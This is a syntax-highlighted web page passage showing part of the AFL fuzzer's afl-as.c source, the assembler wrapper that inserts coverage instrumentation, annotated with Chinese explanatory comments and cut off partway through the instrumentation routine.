class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Copyright 2013 Google LLC All rights reserved.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">  you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">  You may obtain a copy of the License at:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">  limitations under the License.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   american fuzzy lop - wrapper for GNU as</span></span><br><span class="line"><span class="comment">   ---------------------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Written and maintained by Michal Zalewski &lt;lcamtuf@google.com&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The sole purpose of this wrapper is to preprocess assembly files generated</span></span><br><span class="line"><span class="comment">   by GCC / clang and inject the instrumentation bits included from afl-as.h. It</span></span><br><span class="line"><span class="comment">   is automatically invoked by the toolchain when compiling programs using</span></span><br><span class="line"><span class="comment">   afl-gcc / afl-clang.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Note that it&#x27;s an explicit non-goal to instrument hand-written assembly,</span></span><br><span class="line"><span class="comment">   be it in separate .s files or in __asm__ blocks. The only aspiration this</span></span><br><span class="line"><span class="comment">   utility has right now is to be able to skip them gracefully and allow the</span></span><br><span class="line"><span class="comment">   compilation process to continue.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   That said, see experimental/clang_asm_normalize/ for a solution that may</span></span><br><span class="line"><span class="comment">   allow clang users to make things work even with hand-crafted assembly. Just</span></span><br><span class="line"><span class="comment">   note that there is no equivalent for GCC.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AFL_MAIN</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;alloc-inl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;afl-as.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u8** as_params;          <span class="comment">/* Parameters passed to the real &#x27;as&#x27;   */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u8*  input_file;         <span class="comment">/* Originally specified input file      */</span></span><br><span class="line"><span class="keyword">static</span> u8*  modified_file;      <span class="comment">/* Instrumented file for the real &#x27;as&#x27;  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u8   be_quiet,           <span class="comment">/* Quiet mode (no stderr output)        */</span></span><br><span class="line">            clang_mode,         <span class="comment">/* Running in clang mode?               */</span></span><br><span class="line">            pass_thru,          <span class="comment">/* Just pass data through?              */</span></span><br><span class="line">            just_version,       <span class="comment">/* Just show version?                   */</span></span><br><span class="line">            sanitizer;          <span class="comment">/* Using ASAN / MSAN                    */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u32  inst_ratio = <span class="number">100</span>,   <span class="comment">/* Instrumentation probability (%)      */</span></span><br><span class="line">            as_par_cnt = <span class="number">1</span>;     <span class="comment">/* Number of params to &#x27;as&#x27;             */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* If we don&#x27;t find --32 or --64 in the command line, default to</span></span><br><span class="line"><span class="comment">   instrumentation for whichever mode we were compiled with. This is not</span></span><br><span class="line"><span class="comment">   perfect, but should do the trick for almost all use cases. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u8   use_64bit = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> u8   use_64bit = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">error</span> <span class="meta-string">&quot;Sorry, 32-bit Apple platforms are not supported.&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Examine and modify parameters to pass to &#x27;as&#x27;. Note that the file name</span></span><br><span class="line"><span class="comment">   is always the last parameter passed by GCC, so we exploit this property</span></span><br><span class="line"><span class="comment">   to keep the code simple. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">edit_params</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//获取环境变量</span></span><br><span class="line">  u8 *tmp_dir = getenv(<span class="string">&quot;TMPDIR&quot;</span>), *afl_as = getenv(<span class="string">&quot;AFL_AS&quot;</span>);</span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__<span class="comment">//如果是苹果平台</span></span></span><br><span class="line"></span><br><span class="line">  u8 use_clang_as = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* On MacOS X, the Xcode cctool &#x27;as&#x27; driver is a bit stale and does not work</span></span><br><span class="line"><span class="comment">     with the code generated by newer versions of clang that are hand-built</span></span><br><span class="line"><span class="comment">     by the user. See the thread here: http://goo.gl/HBWDtn.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To work around this, when using clang and running without AFL_AS</span></span><br><span class="line"><span class="comment">     specified, we will actually call &#x27;clang -c&#x27; instead of &#x27;as -q&#x27; to</span></span><br><span class="line"><span class="comment">     compile the assembly file.m</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The tools aren&#x27;t cmdline-compatible, but at least for now, we can</span></span><br><span class="line"><span class="comment">     seemingly get away with this by making only very minor tweaks. Thanks</span></span><br><span class="line"><span class="comment">     to Nico Weber for the idea. */</span></span><br><span class="line">  <span class="comment">//如果是clang模式并且没有获取到afl_as环境变量</span></span><br><span class="line">  <span class="keyword">if</span> (clang_mode &amp;&amp; !afl_as) &#123;</span><br><span class="line"></span><br><span class="line">    use_clang_as = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    afl_as = getenv(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = <span class="string">&quot;clang&quot;</span>;<span class="comment">//获取环境变量并赋值</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Although this is not documented, GCC also uses TEMP and TMP when TMPDIR</span></span><br><span class="line"><span class="comment">     is not set. We need to check these non-standard variables to properly</span></span><br><span class="line"><span class="comment">     handle the pass_thru logic later on. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = getenv(<span class="string">&quot;TEMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = getenv(<span class="string">&quot;TMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="string">&quot;/tmp&quot;</span>;<span class="comment">//获取环境变量并赋值</span></span><br><span class="line">  <span class="comment">//为as_params开辟空间</span></span><br><span class="line">  as_params = ck_alloc((argc + <span class="number">32</span>) * <span class="keyword">sizeof</span>(u8*));</span><br><span class="line">  <span class="comment">//判断afl_as是否已经获取到“AFL_AS”环境变量,获取了就赋值，没获取就赋值字符串”as“</span></span><br><span class="line">  as_params[<span class="number">0</span>] = afl_as ? afl_as : (u8*)<span class="string">&quot;as&quot;</span>;</span><br><span class="line">  <span class="comment">//设置最后一个参数为0</span></span><br><span class="line">  as_params[argc] = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//遍历参数</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; argc - <span class="number">1</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--64&quot;</span>)) use_64bit = <span class="number">1</span>;<span class="comment">//如果遍历到&quot;--64&quot;,设置参数</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--32&quot;</span>)) use_64bit = <span class="number">0</span>;<span class="comment">//反之也设置参数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__<span class="comment">//如果是苹果平台</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The Apple case is a bit different... */</span></span><br><span class="line">    <span class="comment">//如果遍历到-arch</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-arch&quot;</span>) &amp;&amp; i + <span class="number">1</span> &lt; argc) &#123;</span><br><span class="line">      <span class="comment">//比较参数并赋值或报错</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;x86_64&quot;</span>)) use_64bit = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;i386&quot;</span>))</span><br><span class="line">        FATAL(<span class="string">&quot;Sorry, 32-bit Apple platforms are not supported.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Strip options that set the preference for a particular upstream</span></span><br><span class="line"><span class="comment">       assembler in Xcode. */</span></span><br><span class="line">    <span class="comment">//如果是clang模式且没匹配到”-q“参数，跳出循环</span></span><br><span class="line">    <span class="keyword">if</span> (clang_mode &amp;&amp; (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-q&quot;</span>) || !<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-Q&quot;</span>)))</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"><span class="comment">//#ifdef结束标志</span></span><br><span class="line">    as_params[as_par_cnt++] = argv[i];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When calling clang as the upstream assembler, append -c -x assembler</span></span><br><span class="line"><span class="comment">     and hope for the best. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (use_clang_as) &#123;</span><br><span class="line">    <span class="comment">//如果是clang模式，追加一系列参数</span></span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-x&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;assembler&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">  <span class="comment">//把最后一个参数的值赋给input_file</span></span><br><span class="line">  input_file = argv[argc - <span class="number">1</span>];</span><br><span class="line">  <span class="comment">//如果input_file首字母是“-”</span></span><br><span class="line">  <span class="keyword">if</span> (input_file[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">//如果是-version，设置对应参数</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(input_file + <span class="number">1</span>, <span class="string">&quot;-version&quot;</span>)) &#123;</span><br><span class="line">      just_version = <span class="number">1</span>;</span><br><span class="line">      modified_file = input_file;</span><br><span class="line">      <span class="keyword">goto</span> wrap_things_up;<span class="comment">//跳转到参数组合结尾</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input_file[<span class="number">1</span>]) FATAL(<span class="string">&quot;Incorrect use (not called through afl-gcc?)&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> input_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if this looks like a standard invocation as a part of an attempt</span></span><br><span class="line"><span class="comment">       to compile a program, rather than using gcc on an ad-hoc .s file in</span></span><br><span class="line"><span class="comment">       a format we may not understand. This works around an issue compiling</span></span><br><span class="line"><span class="comment">       NSS. */</span></span><br><span class="line">    <span class="comment">//如果input_file首字母不是“-”</span></span><br><span class="line">    <span class="comment">/*比对input_file的前strlen(tmp_dir)、9、5个字节是否与tmp_dir、&quot;/var/tmp/&quot;、&quot;/tmp/&quot;是否相同，</span></span><br><span class="line"><span class="comment">    如果都不相同则设置pass_thru为1*/</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(input_file, tmp_dir, <span class="built_in">strlen</span>(tmp_dir)) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/var/tmp/&quot;</span>, <span class="number">9</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/tmp/&quot;</span>, <span class="number">5</span>)) pass_thru = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//设置modified_file为类似tmp_dir/.afl-pid-time.s这样的字符串</span></span><br><span class="line">  modified_file = alloc_printf(<span class="string">&quot;%s/.afl-%u-%u.s&quot;</span>, tmp_dir, getpid(),</span><br><span class="line">                               (u32)time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">wrap_things_up:</span><br><span class="line">  <span class="comment">//接受最后一个参数</span></span><br><span class="line">  as_params[as_par_cnt++] = modified_file;</span><br><span class="line">  as_params[as_par_cnt]   = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Process input file, generate modified_file. Insert instrumentation in all</span></span><br><span class="line"><span class="comment">   the appropriate places. */</span></span><br><span class="line"><span class="comment">//处理输入文件，生成modified_file，插桩</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add_instrumentation</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> u8 line[MAX_LINE];</span><br><span class="line"></span><br><span class="line">  FILE* inf;</span><br><span class="line">  FILE* outf;</span><br><span class="line">  s32 outfd;</span><br><span class="line">  u32 ins_lines = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  u8  instr_ok = <span class="number">0</span>, skip_csect = <span class="number">0</span>, skip_next_label = <span class="number">0</span>,</span><br><span class="line">      skip_intel = <span class="number">0</span>, skip_app = <span class="number">0</span>, instrument_next = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  u8* colon_pos;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">  <span class="comment">//如果存在输入文件名称</span></span><br><span class="line">  <span class="keyword">if</span> (input_file) &#123;</span><br><span class="line">    <span class="comment">//获取input_file，把fd赋值给inf</span></span><br><span class="line">    inf = fopen(input_file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">//找不到报错</span></span><br><span class="line">    <span class="keyword">if</span> (!inf) PFATAL(<span class="string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> inf = <span class="built_in">stdin</span>;<span class="comment">//不存在输入文件名则赋值标准输入</span></span><br><span class="line">  <span class="comment">//以写的形式打开modified_file，如果文件存在就直接打开，不存在就创一个</span></span><br><span class="line">  outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>);</span><br><span class="line">  <span class="comment">//如果文件没有写权限，则报错</span></span><br><span class="line">  <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);</span><br><span class="line">  <span class="comment">//打开文件</span></span><br><span class="line">  outf = fdopen(outfd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="comment">//打不开报错</span></span><br><span class="line">  <span class="keyword">if</span> (!outf) PFATAL(<span class="string">&quot;fdopen() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*循环读取inf指向的文件逐行读取并保存到line数组，每行最多MAX_LINE(8192)个字节，包含&#x27;\0&#x27;</span></span><br><span class="line"><span class="comment">   注意：每读一行进入一次循环*/</span></span><br><span class="line">  <span class="keyword">while</span> (fgets(line, MAX_LINE, inf)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In some cases, we want to defer writing the instrumentation trampoline</span></span><br><span class="line"><span class="comment">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span></span><br><span class="line"><span class="comment">       mode, and if the line starts with a tab followed by a character, dump</span></span><br><span class="line"><span class="comment">       the trampoline now. */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//做了一系列判断，instrument_next和instr_ok是否都为1，以及line是否以\t开始，且line[1]是否是字母</span></span><br><span class="line">    <span class="comment">/*instr_ok代表的是一个flag,当它被设为1时，代表在.text段，当它为1时，就会在分支处进行插桩*/</span></span><br><span class="line">    <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">        instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line">      <span class="comment">//向outf中写入trampoline_fmt64/32,长度小于MAP_SIZE(插桩)</span></span><br><span class="line">      <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">              R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">      instrument_next = <span class="number">0</span>;</span><br><span class="line">      ins_lines++;<span class="comment">//插桩计数器++</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output the actual line, call it a day in pass-thru mode. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//将line里的内容放入outf</span></span><br><span class="line">    <span class="built_in">fputs</span>(line, outf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All right, this is where the actual fun begins. For one, we only want to</span></span><br><span class="line"><span class="comment">       instrument the .text section. So, let&#x27;s keep track of that in processed</span></span><br><span class="line"><span class="comment">       files - and let&#x27;s set instr_ok accordingly. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断line的值开头是否为&quot;\t.&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* OpenBSD puts jump tables directly inline with the code, which is</span></span><br><span class="line"><span class="comment">         a bit annoying. They use a specific format of p2align directives</span></span><br><span class="line"><span class="comment">         around them, so we use that as a signal. */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//检查到line里有p2align指令且line[10]是数字，赋值</span></span><br><span class="line">      <span class="keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;</span><br><span class="line">          <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp; line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) skip_next_label = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*检测到line里有\t.[text\n|section\t.text|section\t__TEXT,__text|section __TEXT,__text]...</span></span><br><span class="line"><span class="comment">        其中一个，则将instr_ok设为1，跳出循环读取下一行内容*/</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//同理</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect off-flavor assembly (rare, happens in gdb). When this is</span></span><br><span class="line"><span class="comment">       encountered, we set skip_csect until the opposite directive is</span></span><br><span class="line"><span class="comment">       seen, and 